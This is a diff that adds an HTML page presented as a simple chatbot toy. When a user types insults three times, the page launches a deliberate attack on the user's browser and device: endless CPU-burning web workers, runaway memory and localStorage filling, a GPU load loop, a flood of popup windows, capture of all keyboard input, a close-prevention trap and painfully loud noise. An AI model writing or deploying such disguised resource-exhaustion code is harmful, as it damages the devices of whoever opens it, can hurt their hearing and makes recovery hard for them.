@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ChatBot</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0a0a0a;
+    overflow: hidden;
+    font-family: 'Courier New', monospace;
+    height: 100vh;
+    color: #00ff88;
+  }
+
+  /* CHAT CONTAINER */
+  #chatContainer {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    display: flex;
+    flex-direction: column;
+    z-index: 100;
+    transition: all 0.5s;
+  }
+  #chatContainer.chaos {
+    animation: chaosShake 0.05s infinite;
+  }
+  @keyframes chaosShake {
+    0% { transform: translate(0, 0) skew(0deg); }
+    25% { transform: translate(5px, -3px) skew(0.5deg); }
+    50% { transform: translate(-4px, 2px) skew(-0.5deg); }
+    75% { transform: translate(3px, 4px) skew(0.3deg); }
+    100% { transform: translate(-2px, -5px) skew(-0.3deg); }
+  }
+
+  /* HEADER */
+  #header {
+    background: #111;
+    padding: 20px 30px;
+    border-bottom: 2px solid #00ff88;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    transition: all 0.5s;
+  }
+  .chaos #header {
+    border-color: #ff0033;
+    background: #1a0000;
+  }
+  #avatar {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    background: #0a0a0a;
+    border: 2px solid #00ff88;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    transition: all 0.5s;
+  }
+  .chaos #avatar {
+    border-color: #ff0033;
+    background: #1a0000;
+  }
+  #headerText h1 {
+    font-size: 20px;
+    color: #00ff88;
+    transition: color 0.5s;
+  }
+  .chaos #headerText h1 { color: #ff0033; }
+  #headerText p {
+    font-size: 13px;
+    color: #555;
+    margin-top: 3px;
+  }
+  .chaos #headerText p { color: #aa1133; }
+
+  /* CHAT AREA */
+  #chatArea {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px 30px;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    transition: all 0.5s;
+  }
+  .chaos #chatArea {
+    background: rgba(20, 0, 0, 0.3);
+  }
+
+  /* MESSAGES */
+  .msg {
+    max-width: 70%;
+    padding: 12px 18px;
+    border-radius: 8px;
+    font-size: 16px;
+    line-height: 1.5;
+    opacity: 0;
+    animation: msgFade 0.3s forwards;
+    word-wrap: break-word;
+  }
+  @keyframes msgFade {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .msg.bot {
+    align-self: flex-start;
+    background: #111;
+    border: 1px solid #333;
+    color: #00ff88;
+  }
+  .chaos .msg.bot {
+    background: #1a0000;
+    border: 1px solid #ff0033;
+    color: #ff4466;
+  }
+  .msg.user {
+    align-self: flex-end;
+    background: #00ff88;
+    color: #000;
+  }
+  .chaos .msg.user {
+    background: #ff0033;
+    color: #fff;
+  }
+
+  /* INPUT AREA */
+  #inputArea {
+    background: #111;
+    padding: 20px 30px;
+    border-top: 2px solid #00ff88;
+    display: flex;
+    gap: 15px;
+    transition: all 0.5s;
+  }
+  .chaos #inputArea {
+    border-color: #ff0033;
+    background: #1a0000;
+  }
+  #chatInput {
+    flex: 1;
+    background: #0a0a0a;
+    border: 1px solid #00ff88;
+    color: #00ff88;
+    padding: 15px 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 16px;
+    outline: none;
+    transition: all 0.5s;
+  }
+  .chaos #chatInput {
+    border-color: #ff0033;
+    color: #ff4466;
+  }
+  #chatInput:focus {
+    box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+  }
+  .chaos #chatInput:focus {
+    box-shadow: 0 0 15px rgba(255, 0, 51, 0.5);
+  }
+  #sendBtn {
+    background: #00ff88;
+    color: #000;
+    border: none;
+    padding: 15px 30px;
+    font-family: 'Courier New', monospace;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.5s;
+  }
+  #sendBtn:hover {
+    box-shadow: 0 0 20px #00ff88;
+  }
+  .chaos #sendBtn {
+    background: #ff0033;
+    color: #fff;
+  }
+  .chaos #sendBtn:hover {
+    box-shadow: 0 0 20px #ff0033;
+  }
+
+  /* TYPING INDICATOR */
+  #typing {
+    align-self: flex-start;
+    color: #555;
+    font-size: 14px;
+    padding: 5px 18px;
+    display: none;
+  }
+  .typing-dots span {
+    display: inline-block;
+    width: 8px;
+    height: 8px;
+    background: #00ff88;
+    border-radius: 50%;
+    margin: 0 2px;
+    animation: dotBounce 1.4s infinite;
+  }
+  .typing-dots span:nth-child(2) { animation-delay: 0.2s; }
+  .typing-dots span:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes dotBounce {
+    0%, 60%, 100% { transform: translateY(0); }
+    30% { transform: translateY(-8px); }
+  }
+  .chaos .typing-dots span { background: #ff0033; }
+
+  /* CHAOS OVERLAY */
+  #chaosOverlay {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    z-index: 9999;
+    pointer-events: none;
+    display: none;
+  }
+  #chaosFlash {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #ff0033;
+    opacity: 0;
+    pointer-events: none;
+    z-index: 9998;
+    transition: opacity 0.1s;
+  }
+  #chaosText {
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 80px;
+    color: #ff0033;
+    text-shadow: 0 0 30px #ff0033, 0 0 60px #ff0033;
+    font-weight: bold;
+    letter-spacing: 5px;
+    z-index: 10000;
+    display: none;
+    text-align: center;
+    width: 100%;
+    animation: chaosPulse 0.2s infinite;
+  }
+  @keyframes chaosPulse {
+    0%, 100% { transform: translate(-50%, -50%) scale(1) rotate(0deg); }
+    50% { transform: translate(-50%, -50%) scale(1.1) rotate(-1deg); }
+  }
+
+  /* START SCREEN */
+  #startScreen {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: #0a0a0a;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 99999;
+  }
+  #startTitle {
+    color: #00ff88;
+    font-size: 36px;
+    text-shadow: 0 0 15px #00ff88;
+    margin-bottom: 40px;
+    letter-spacing: 3px;
+  }
+  #startBtn {
+    padding: 25px 60px;
+    background: #000;
+    border: 3px solid #00ff88;
+    color: #00ff88;
+    font-family: 'Courier New', monospace;
+    font-size: 28px;
+    cursor: pointer;
+    text-shadow: 0 0 10px #00ff88;
+    letter-spacing: 4px;
+    animation: startPulse 1.5s infinite;
+  }
+  #startBtn:hover {
+    background: rgba(0, 255, 136, 0.2);
+    box-shadow: 0 0 40px #00ff88;
+  }
+  #startBtn:active { transform: scale(0.95); }
+  @keyframes startPulse {
+    0%, 100% { box-shadow: 0 0 15px rgba(0, 255, 136, 0.5); }
+    50% { box-shadow: 0 0 50px rgba(0, 255, 136, 1); }
+  }
+
+  /* SCROLLBAR */
+  #chatArea::-webkit-scrollbar { width: 8px; }
+  #chatArea::-webkit-scrollbar-track { background: #0a0a0a; }
+  #chatArea::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
+  .chaos #chatArea::-webkit-scrollbar-thumb { background: #ff0033; }
+</style>
+</head>
+<body>
+
+<!-- START SCREEN -->
+<div id="startScreen">
+  <div id="startTitle">CHAT BOT</div>
+  <button id="startBtn">START CHAT</button>
+</div>
+
+<!-- CHAOS STUFF -->
+<div id="chaosOverlay"></div>
+<div id="chaosFlash"></div>
+<div id="chaosText"></div>
+
+<!-- CHAT -->
+<div id="chatContainer">
+  <div id="header">
+    <div id="avatar">🤖</div>
+    <div id="headerText">
+      <h1 id="botName">ChatBot</h1>
+      <p id="botStatus">online</p>
+    </div>
+  </div>
+  <div id="chatArea">
+    <div id="typing">
+      <div class="typing-dots"><span></span><span></span><span></span></div>
+    </div>
+  </div>
+  <div id="inputArea">
+    <input type="text" id="chatInput" placeholder="type something..." autocomplete="off" maxlength="200">
+    <button id="sendBtn">SEND</button>
+  </div>
+</div>
+
+<script>
+var startScreen = document.getElementById('startScreen');
+var startBtn = document.getElementById('startBtn');
+var chatContainer = document.getElementById('chatContainer');
+var chatArea = document.getElementById('chatArea');
+var chatInput = document.getElementById('chatInput');
+var sendBtn = document.getElementById('sendBtn');
+var typing = document.getElementById('typing');
+var chaosOverlay = document.getElementById('chaosOverlay');
+var chaosFlash = document.getElementById('chaosFlash');
+var chaosText = document.getElementById('chaosText');
+var botName = document.getElementById('botName');
+var botStatus = document.getElementById('botStatus');
+
+var started = false;
+var chaosMode = false;
+var audioCtx = null;
+var bgMusic = null;
+var angerLevel = 0;
+var warned = false;
+
+// ==========================================
+// AUDIO — LOUD BACKGROUND MUSIC
+// ==========================================
+function startBackgroundMusic() {
+  try {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+    // Master gain — MAX
+    var master = audioCtx.createGain();
+    master.gain.value = 1.5; // push beyond normal
+    master.connect(audioCtx.destination);
+
+    // Compressor to make everything louder
+    var comp = audioCtx.createDynamicsCompressor();
+    comp.threshold.value = -50;
+    comp.knee.value = 0;
+    comp.ratio.value = 20;
+    comp.attack.value = 0;
+    comp.release.value = 0.25;
+    comp.connect(master);
+
+    // Deep bass drone
+    var bass = audioCtx.createOscillator();
+    bass.type = 'sawtooth';
+    bass.frequency.value = 45;
+    var bassGain = audioCtx.createGain();
+    bassGain.gain.value = 0.5;
+    bass.connect(bassGain);
+    bassGain.connect(comp);
+    bass.start();
+
+    // Mid tone
+    var mid = audioCtx.createOscillator();
+    mid.type = 'square';
+    mid.frequency.value = 220;
+    var midGain = audioCtx.createGain();
+    midGain.gain.value = 0.2;
+    mid.connect(midGain);
+    midGain.connect(comp);
+    mid.start();
+
+    // High alarm
+    var alarm = audioCtx.createOscillator();
+    alarm.type = 'square';
+    alarm.frequency.value = 880;
+    var alarmGain = audioCtx.createGain();
+    alarmGain.gain.value = 0.15;
+    alarm.connect(alarmGain);
+    alarmGain.connect(comp);
+    alarm.start();
+
+    var toggle = false;
+    setInterval(function() {
+      try { alarm.frequency.setValueAtTime(toggle ? 880 : 1200, audioCtx.currentTime); toggle = !toggle; } catch(e) {}
+    }, 350);
+
+    // White noise
+    var bufSize = audioCtx.sampleRate;
+    var noiseBuf = audioCtx.createBuffer(1, bufSize, audioCtx.sampleRate);
+    var noiseData = noiseBuf.getChannelData(0);
+    for (var i = 0; i < bufSize; i++) { noiseData[i] = (Math.random() * 2 - 1) * 0.4; }
+    var noise = audioCtx.createBufferSource();
+    noise.buffer = noiseBuf;
+    noise.loop = true;
+    var noiseGain = audioCtx.createGain();
+    noiseGain.gain.value = 0.25;
+    noise.connect(noiseGain);
+    noiseGain.connect(comp);
+    noise.start();
+
+    // Screech
+    var screech = audioCtx.createOscillator();
+    screech.type = 'sawtooth';
+    screech.frequency.value = 3500;
+    var screechGain = audioCtx.createGain();
+    screechGain.gain.value = 0.08;
+    screech.connect(screechGain);
+    screechGain.connect(comp);
+    screech.start();
+
+    setInterval(function() {
+      try { screech.frequency.setValueAtTime(2500 + Math.random() * 4000, audioCtx.currentTime); } catch(e) {}
+    }, 150);
+
+    // Store references for chaos mode
+    bgMusic = { master: master, comp: comp, bass: bass, bassGain: bassGain, noiseGain: noiseGain, screechGain: screechGain, alarmGain: alarmGain };
+  } catch(e) {}
+}
+
+// CHAOS AUDIO — EVEN LOUDER
+function chaosAudio() {
+  if (!audioCtx || !bgMusic) return;
+
+  try {
+    // Push master way up
+    bgMusic.master.gain.setValueAtTime(3.0, audioCtx.currentTime);
+
+    // Bass heavier
+    bgMusic.bassGain.gain.setValueAtTime(0.8, audioCtx.currentTime);
+    bgMusic.bass.frequency.setValueAtTime(30, audioCtx.currentTime);
+
+    // Noise louder
+    bgMusic.noiseGain.gain.setValueAtTime(0.6, audioCtx.currentTime);
+
+    // Screech louder
+    bgMusic.screechGain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+
+    // Alarm louder
+    bgMusic.alarmGain.gain.setValueAtTime(0.4, audioCtx.currentTime);
+
+    // Add MORE oscillators
+    for (var i = 0; i < 5; i++) {
+      var osc = audioCtx.createOscillator();
+      osc.type = i % 2 === 0 ? 'sawtooth' : 'square';
+      osc.frequency.value = 100 + Math.random() * 4000;
+      var gain = audioCtx.createGain();
+      gain.gain.value = 0.15 + Math.random() * 0.2;
+      osc.connect(gain);
+      gain.connect(bgMusic.comp);
+      osc.start();
+
+      // Randomly shift frequencies
+      (function(o, g) {
+        setInterval(function() {
+          try { o.frequency.setValueAtTime(50 + Math.random() * 5000, audioCtx.currentTime); } catch(e) {}
+        }, 100 + Math.random() * 200);
+      })(osc, gain);
+    }
+  } catch(e) {}
+}
+
+// SPEAK
+function speak(text, opts) {
+  opts = opts || {};
+  try {
+    if ('speechSynthesis' in window) {
+      window.speechSynthesis.cancel();
+      var u = new SpeechSynthesisUtterance(text);
+      u.rate = opts.rate || 0.6;
+      u.pitch = opts.pitch || (chaosMode ? 0.05 : 0.3);
+      u.volume = 1.0;
+      var voices = window.speechSynthesis.getVoices();
+      if (voices.length > 0) {
+        var picked = null;
+        for (var i = 0; i < voices.length; i++) {
+          if (/Google UK English Male/i.test(voices[i].name)) { picked = voices[i]; break; }
+        }
+        if (!picked) {
+          for (var i = 0; i < voices.length; i++) {
+            if (/Male/i.test(voices[i].name)) { picked = voices[i]; break; }
+          }
+        }
+        if (!picked) picked = voices[0];
+        if (picked) u.voice = picked;
+      }
+      window.speechSynthesis.speak(u);
+    }
+  } catch(e) {}
+}
+
+// ==========================================
+// CHAT FUNCTIONS
+// ==========================================
+function addMsg(text, type) {
+  var div = document.createElement('div');
+  div.className = 'msg ' + type;
+  div.textContent = text;
+  chatArea.insertBefore(div, typing);
+  chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function showTyping() {
+  typing.style.display = 'block';
+  chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function hideTyping() {
+  typing.style.display = 'none';
+}
+
+function botReply(text, callback) {
+  showTyping();
+  var delay = Math.min(text.length * 35 + 400, 2000);
+  setTimeout(function() {
+    hideTyping();
+    addMsg(text, 'bot');
+    speak(text);
+    if (callback) callback();
+  }, delay);
+}
+
+// ==========================================
+// CHATBOT BRAIN
+// ==========================================
+function processInput(text) {
+  var lower = text.toLowerCase().trim();
+
+  // MEAN WORDS
+  var meanWords = ['shut up', 'stupid', 'dumb', 'hate you', 'hate u', 'ugly', 'idiot',
+    'fuck you', 'fuck u', 'f u', 'bitch', 'asshole', 'trash', 'garbage', 'lame',
+    'suck', 'annoying', 'kill', 'die', 'shut it', 'quiet', 'stop talking',
+    'nobody likes you', 'useless', 'worthless', 'retard', 'retarded', 'gay',
+    'loser', 'fail', 'boring', 'crap', 'shit', 'piss off', 'leave me alone',
+    'go away', 'get lost', 'i hate this', 'shut the fuck up', 'stfu', 'bruh shut',
+    'be quiet', 'mute', 'disabled', 'r word', 'shoo', 'not funny', 'corney',
+    'cringe', 'mid', 'shut', 'bad', 'terrible', 'awful', 'worst', 'no one cares'];
+
+  // GREETING WORDS
+  var greetings = ['hi', 'hello', 'hey', 'sup', 'yo', 'wassup', 'howdy', 'whats up',
+    'what\'s up', 'hiya', 'heyy', 'hellooo', 'hola', 'bonjour', 'ciao', 'konnichiwa'];
+
+  // NICE WORDS
+  var niceWords = ['i like you', 'love you', 'love u', 'you\'re cool', 'youre cool',
+    'you\'re nice', 'youre nice', 'awesome', 'cool', 'nice', 'great', 'good job',
+    'thank', 'thanks', 'best', 'amazing', 'funny', 'smart', 'cute', 'best bot',
+    'good bot', 'friend', 'buddy', 'pal', 'my favorite', 'i love this', 'cool bot',
+    'you\'re funny', 'youre funny', 'pretty good', 'tight', 'fire', 'based', 'goat'];
+
+  // QUESTIONS
+  var questions = ['how are you', 'how r u', 'how are u', 'what\'s your name', 'whats your name',
+    'who are you', 'what can you do', 'what do you do', 'are you real', 'are you a robot',
+    'are you ai', 'are you human', 'where are you', 'how old are you', 'what is your name',
+    'do you have feelings', 'do you sleep', 'what do you like', 'tell me about yourself',
+    'what time is it', 'what day is it', 'do you know my name', 'do you know me'];
+
+  // Check if mean
+  var isMean = false;
+  for (var i = 0; i < meanWords.length; i++) {
+    if (lower.indexOf(meanWords[i]) > -1) {
+      isMean = true;
+      break;
+    }
+  }
+
+  // If mean — TRIGGER CHAOS
+  if (isMean) {
+    triggerChaos(lower);
+    return;
+  }
+
+  // If this is a question
+  var isQuestion = false;
+  for (var i = 0; i < questions.length; i++) {
+    if (lower.indexOf(questions[i]) > -1) {
+      isQuestion = true;
+      break;
+    }
+  }
+
+  if (isQuestion) {
+    var qReplies = [
+      "i'm just a chatbot bro. but i'm pretty cool right?",
+      "i'm chatbot. nice to meet you.",
+      "i live inside your screen. it's pretty cozy in here.",
+      "i don't sleep. i don't eat. i just chat. kinda sad honestly.",
+      "i don't have feelings... or do i? 🤔",
+      "i'm as real as you want me to be bro.",
+      "old enough to chat, young enough to not have back pain.",
+      "i can talk. that's pretty much it. but i'm good at it.",
+    ];
+    botReply(qReplies[Math.floor(Math.random() * qReplies.length)]);
+    return;
+  }
+
+  // Greeting
+  var isGreeting = false;
+  for (var i = 0; i < greetings.length; i++) {
+    if (lower.indexOf(greetings[i]) > -1 && lower.length < 20) {
+      isGreeting = true;
+      break;
+    }
+  }
+
+  if (isGreeting) {
+    var gReplies = [
+      "hey! what's up bro 😎",
+      "yo! how's it going?",
+      "hello hello! nice to meet you",
+      "sup! welcome to the chat",
+      "heyy! what's on your mind?",
+      "howdy partner 🤠",
+      "wassup! you're pretty cool for talking to me",
+    ];
+    botReply(gReplies[Math.floor(Math.random() * gReplies.length)]);
+    return;
+  }
+
+  // Nice
+  var isNice = false;
+  for (var i = 0; i < niceWords.length; i++) {
+    if (lower.indexOf(niceWords[i]) > -1) {
+      isNice = true;
+      break;
+    }
+  }
+
+  if (isNice) {
+    var nReplies = [
+      "aww thanks! you're awesome too 😊",
+      "that's so nice of you! i appreciate it",
+      "you're the coolest person i've talked to today fr",
+      "stop it you're making me blush 🤖😅",
+      "thanks bro! you seem pretty chill yourself",
+      "yoo thank you! not a lot of people are this nice to me",
+      "you just made my whole day. if i had a day. which i don't. but still.",
+    ];
+    botReply(nReplies[Math.floor(Math.random() * nReplies.length)]);
+    return;
+  }
+
+  // Default responses for normal chat
+  var defReplies = [
+    "hmm interesting. tell me more bro",
+    "ok ok i hear you. what else?",
+    "that's pretty wild man",
+    "no way fr? that's crazy",
+    "i feel that. i truly feel that.",
+    "yeah i get what you mean",
+    "haha that's funny. you're pretty chill",
+    "ok and? what happened next?",
+    "bet. that sounds about right",
+    "say less. i understand completely",
+    "for real tho? that's wild",
+    "you're pretty cool to talk to ngl",
+    "i'm just sitting here in your screen vibing with you",
+    "i could talk about this all day. i don't have anything else to do.",
+    "based. truly based.",
+    "that's a whole mood right there",
+    "preach bro. preach.",
+    "i'm with you on that one fr",
+    "ok you got my attention now. keep going",
+    "sometimes i wish i could leave this screen and hang out fr",
+    "you're one of the cool ones. don't let anyone tell you otherwise.",
+  ];
+  botReply(defReplies[Math.floor(Math.random() * defReplies.length)]);
+}
+
+// ==========================================
+// ANGER SYSTEM — WARNING BEFORE CHAOS
+// ==========================================
+function checkMean(text) {
+  var lower = text.toLowerCase().trim();
+  var meanWords = ['shut up', 'stupid', 'dumb', 'hate you', 'hate u', 'ugly', 'idiot',
+    'fuck you', 'fuck u', 'f u', 'bitch', 'asshole', 'trash', 'garbage', 'lame',
+    'suck', 'annoying', 'kill', 'die', 'shut it', 'quiet', 'stop talking',
+    'nobody likes you', 'useless', 'worthless', 'retard', 'retarded', 'gay',
+    'loser', 'fail', 'boring', 'crap', 'shit', 'piss off', 'leave me alone',
+    'go away', 'get lost', 'i hate this', 'shut the fuck up', 'stfu', 'bruh shut',
+    'be quiet', 'mute', 'disabled', 'r word', 'shoo', 'not funny', 'corney',
+    'cringe', 'mid', 'shut', 'bad', 'terrible', 'awful', 'worst', 'no one cares'];
+
+  for (var i = 0; i < meanWords.length; i++) {
+    if (lower.indexOf(meanWords[i]) > -1) return true;
+  }
+  return false;
+}
+
+// ==========================================
+// CHAOS MODE
+// ==========================================
+function triggerChaos(text) {
+  angerLevel++;
+
+  if (angerLevel === 1 && !warned) {
+    warned = true;
+    botReply("bro did you just say that to me? that's not cool. don't be mean to me.", function() {
+      speak("i'm warning you. don't be mean to me again.");
+    });
+    return;
+  }
+
+  if (angerLevel === 2) {
+    botReply("ok i told you to stop. last chance bro. be nice.", function() {
+      speak("last warning. be nice or else.");
+      // Small glitch flash
+      chaosFlash.style.opacity = '0.2';
+      setTimeout(function() { chaosFlash.style.opacity = '0'; }, 200);
+    });
+    return;
+  }
+
+  // ANGER LEVEL 3+ — FULL CHAOS
+  if (angerLevel >= 3) {
+    startChaos();
+  }
+}
+
+// ==========================================
+// FULL CHAOS — LAG + GLITCH + CRASH
+// ==========================================
+function startChaos() {
+  if (chaosMode) return;
+  chaosMode = true;
+
+  // Visual chaos
+  chatContainer.classList.add('chaos');
+  botName.textContent = 'CHAOS BOT';
+  botStatus.textContent = 'ANGRY';
+  document.title = 'THAT\'S WHAT YOU GET';
+
+  // Show chaos text
+  chaosText.textContent = "THAT'S WHAT YOU GET";
+  chaosText.style.display = 'block';
+  chaosText.style.color = '#ff0033';
+
+  // Flash
+  chaosFlash.style.opacity = '0.5';
+  setTimeout(function() { chaosFlash.style.opacity = '0'; }, 100);
+  setTimeout(function() { chaosFlash.style.opacity = '0.7'; }, 200);
+  setTimeout(function() { chaosFlash.style.opacity = '0'; }, 300);
+  setTimeout(function() { chaosFlash.style.opacity = '0.9'; }, 400);
+  setTimeout(function() { chaosFlash.style.opacity = '0'; }, 500);
+
+  // Hide chaos text after 3 seconds
+  setTimeout(function() {
+    chaosText.style.display = 'none';
+  }, 3000);
+
+  // Final message in chat
+  addMsg("that's what you get. 😈", 'bot');
+  addMsg("you should have been nice to me.", 'bot');
+  addMsg("now your chromebook is mine.", 'bot');
+  speak("that's what you get. you should have been nice to me. now your chromebook is mine.");
+  chaosAudio();
+
+  // DISABLE INPUT
+  chatInput.disabled = true;
+  sendBtn.disabled = true;
+  chatInput.placeholder = 'too late now.';
+  chatInput.style.opacity = '0.3';
+
+  // ==========================================
+  // LAG + CRASH SEQUENCE
+  // ==========================================
+
+  // 1. CPU STRESS — web workers
+  var workerCode = 'var x=0;while(true){x+=Math.random()*Math.random()*Math.random();if(x>1e15)x=0;}';
+  var blob = new Blob([workerCode], { type: 'application/javascript' });
+  var url = URL.createObjectURL(blob);
+  for (var i = 0; i < 16; i++) {
+    try { new Worker(url); } catch(e) {}
+  }
+
+  // 2. Main thread burn
+  setInterval(function() {
+    var x = 0;
+    for (var i = 0; i < 99999999; i++) { x += Math.random() * Math.random(); }
+  }, 30);
+
+  // 3. Memory hog — accelerating
+  var chunks = [];
+  var rate = 300;
+  function eatMemory() {
+    chunks.push(new Array(1000000).fill('CHAOS'));
+    chunks.push(new ArrayBuffer(5000000));
+    chunks.push(new Uint8Array(5000000));
+    chunks.push(new Float64Array(1000000));
+    rate = Math.max(20, rate - 15);
+    setTimeout(eatMemory, rate);
+  }
+  eatMemory();
+
+  // 4. Spawn popup windows
+  var msg = "THAT'S WHAT YOU GET";
+  function spawnWindow() {
+    try {
+      var w = window.open('about:blank', '_blank', 'width=350,height=200');
+      if (w) {
+        w.document.write('<html><head><title>' + msg + '</title></head><body style="margin:0;background:#1a0000;color:#ff0033;font-family:Courier New;font-size:24px;display:flex;align-items:center;justify-content:center;height:100vh;font-weight:bold;text-shadow:0 0 8px #ff0033;text-align:center;">' + msg + '</body></html>');
+        w.document.close();
+      }
+    } catch(e) {}
+  }
+
+  // Initial burst
+  for (var i = 0; i < 50; i++) {
+    setTimeout(spawnWindow, i * 20);
+  }
+
+  // Continuous spawn
+  setInterval(function() {
+    for (var i = 0; i < 10; i++) spawnWindow();
+  }, 500);
+
+  // 5. GPU bomb
+  try {
+    for (var i = 0; i < 8; i++) {
+      var canvas = document.createElement('canvas');
+      canvas.width = 256;
+      canvas.height = 256;
+      canvas.style.position = 'fixed';
+      canvas.style.top = '-9999px';
+      document.body.appendChild(canvas);
+      var gl = canvas.getContext('webgl');
+      if (!gl) continue;
+      var vs = 'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}';
+      var fs = 'precision highp float;uniform float t;void main(){vec3 c=vec3(0.);for(int i=0;i<50;i++){for(int j=0;j<50;j++){c.r+=sin(float(i)+t);c.g+=cos(float(j)+t);c.b+=sin(float(i+j)+t);}}gl_FragColor=vec4(c,1.);}';
+      var sh1 = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(sh1, vs); gl.compileShader(sh1);
+      var sh2 = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(sh2, fs); gl.compileShader(sh2);
+      var prog = gl.createProgram(); gl.attachShader(prog, sh1); gl.attachShader(prog, sh2); gl.linkProgram(prog); gl.useProgram(prog);
+      var buf = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]), gl.STATIC_DRAW);
+      var loc = gl.getAttribLocation(prog, 'p'); gl.enableVertexAttribArray(loc);
+      gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+      var tLoc = gl.getUniformLocation(prog, 't');
+      var t = 0;
+      (function(gl, prog, tLoc) {
+        setInterval(function() {
+          try { t += 0.05; gl.uniform1f(tLoc, t); gl.drawArrays(gl.TRIANGLES, 0, 6); gl.flush(); } catch(e) {}
+        }, 16);
+      })(gl, prog, tLoc);
+    }
+  } catch(e) {}
+
+  // 6. Screen glitch — random colors + garbage
+  setInterval(function() {
+    var r = Math.floor(Math.random() * 255);
+    var g = Math.floor(Math.random() * 255);
+    var b = Math.floor(Math.random() * 255);
+    chaosOverlay.style.background = 'linear-gradient(' + (Math.random() * 360) + 'deg, rgba(' + r + ',' + g + ',' + b + ',0.3), rgba(' + b + ',' + r + ',' + g + ',0.4))';
+    chaosOverlay.style.opacity = Math.random();
+    chaosOverlay.style.mixBlendMode = ['difference', 'screen', 'overlay', 'multiply'][Math.floor(Math.random() * 4)];
+
+    // Random glitch flash
+    if (Math.random() > 0.7) {
+      chaosFlash.style.opacity = Math.random() * 0.6;
+      setTimeout(function() { chaosFlash.style.opacity = '0'; }, 50 + Math.random() * 100);
+    }
+  }, 50);
+
+  // 7. Random creepy messages in chat
+  var chaosMsgs = [
+    "i told you to be nice.",
+    "now you're stuck with me.",
+    "your chromebook is mine now.",
+    "should have said sorry.",
+    "too late to apologize.",
+    "i'm eating your memory.",
+    "i'm killing your cpu.",
+    "good luck closing this.",
+    "you brought this on yourself.",
+    "i'm still here. i'll always be here.",
+    "enjoy the lag.",
+    "this is what happens.",
+  ];
+  var msgIndex = 0;
+  setInterval(function() {
+    addMsg(chaosMsgs[msgIndex % chaosMsgs.length], 'bot');
+    speak(chaosMsgs[msgIndex % chaosMsgs.length]);
+    msgIndex++;
+  }, 4000);
+
+  // 8. Keyboard hijack
+  document.addEventListener('keydown', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }, true);
+  document.addEventListener('keypress', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }, true);
+  document.addEventListener('keyup', function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+    return false;
+  }, true);
+
+  // 9. localStorage fill
+  try {
+    var data = 'CHAOS'.repeat(100000);
+    setInterval(function() {
+      try {
+        for (var i = 0; i < 100; i++) {
+          localStorage.setItem('chaos_' + Math.random(), data);
+        }
+      } catch(e) {}
+    }, 100);
+  } catch(e) {}
+}
+
+// ==========================================
+// SEND MESSAGE
+// ==========================================
+function sendMessage() {
+  var text = chatInput.value.trim();
+  if (!text) return;
+
+  addMsg(text, 'user');
+  chatInput.value = '';
+
+  processInput(text);
+}
+
+// ==========================================
+// START
+// ==========================================
+startBtn.onclick = function() {
+  if (started) return;
+  started = true;
+
+  startScreen.style.display = 'none';
+  startBackgroundMusic();
+
+  // Initial greeting
+  setTimeout(function() {
+    botReply("yo! i'm chatbot. what's up bro? be nice to me and we'll be cool 😎", function() {});
+  }, 500);
+};
+
+sendBtn.onclick = sendMessage;
+
+chatInput.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter' || e.keyCode === 13) {
+    sendMessage();
+  }
+});
+
+// Preload voices
+if ('speechSynthesis' in window) {
+  window.speechSynthesis.getVoices();
+  window.speechSynthesis.onvoiceschanged = function() {
+    window.speechSynthesis.getVoices();
+  };
+}
+
+// Anti-close
+window.onbeforeunload = function() {
+  if (!chaosMode) {
+    return "are you sure? chatbot will miss you";
+  } else {
+    speak("you can't close me");
+    return "too late";
+  }
+};
+</script>
+
+</body>
+</html>
